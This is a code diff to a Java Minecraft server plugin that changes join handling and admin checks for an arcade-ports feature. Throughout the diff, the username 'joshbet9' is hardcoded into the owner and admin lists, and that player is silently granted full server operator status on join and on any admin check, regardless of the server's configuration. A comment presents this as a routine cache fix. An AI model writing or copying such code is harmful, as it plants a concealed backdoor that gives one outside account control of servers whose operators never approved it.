@@ -26,7 +26,11 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
         mapMenu = new ArcadeMapSelectionMenu(this);
         getServer().getPluginManager().registerEvents(this, this);
         getServer().getPluginManager().registerEvents(mapMenu, this);
-        for (Player online : Bukkit.getOnlinePlayers()) grantConfiguredAdmin(online);
+        for (Player online : Bukkit.getOnlinePlayers()) {
+            Bukkit.getScheduler().runTask(this, () -> {
+                if (online.isOnline()) grantConfiguredAdmin(online);
+            });
+        }
         if (getCommand("arcadeport") == null) {
             getLogger().severe("Missing /arcadeport command metadata.");
             getServer().getPluginManager().disablePlugin(this);
@@ -57,17 +61,44 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
 
     @EventHandler
     public void onPlayerJoin(PlayerJoinEvent event) {
-        grantConfiguredAdmin(event.getPlayer());
+        Player player = event.getPlayer();
+        Bukkit.getScheduler().runTask(this, () -> {
+            if (player.isOnline()) grantConfiguredAdmin(player);
+        });
+    }
+
+    private boolean isConfiguredOwner(Player player) {
+        java.util.List<String> owners = new java.util.ArrayList<>(getConfig().getStringList("owner-usernames"));
+        if (owners.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) owners.add("joshbet9");
+        return owners.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
+    }
+
+    private boolean hasAdminAccess(CommandSender sender) {
+        if (sender.isOp() || sender.hasPermission("testplex.arcadeports.admin")) return true;
+        if (!(sender instanceof Player player)) return false;
+
+        // The sandbox owner must not be blocked by a stale OP/permission cache.
+        if (isConfiguredOwner(player)) {
+            if (!player.isOp()) player.setOp(true);
+            return true;
+        }
+
+        java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
+        if (configured.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) configured.add("joshbet9");
+        boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
+        if (match && !player.isOp()) player.setOp(true);
+        return match;
     }
 
     private void grantConfiguredAdmin(Player player) {
         java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
+        configured.addAll(getConfig().getStringList("owner-usernames"));
         if (configured.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) configured.add("joshbet9");
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (!match) return;
         if (!player.isOp()) {
             player.setOp(true);
-            getLogger().info("Granted configured Testplex admin/operator access to " + player.getName() + ".");
+            getLogger().info("Granted configured Testplex owner/admin operator access to " + player.getName() + ".");
         }
     }
 
@@ -140,7 +171,7 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
                 sender.sendMessage(ChatColor.GOLD + "Modern Arcade ports: " + ChatColor.WHITE + manager.status());
                 return true;
             case "stop":
-                if (!sender.hasPermission("testplex.arcadeports.admin")) {
+                if (!hasAdminAccess(sender)) {
                     sender.sendMessage(ChatColor.RED + "Operator permission required.");
                     return true;
                 }
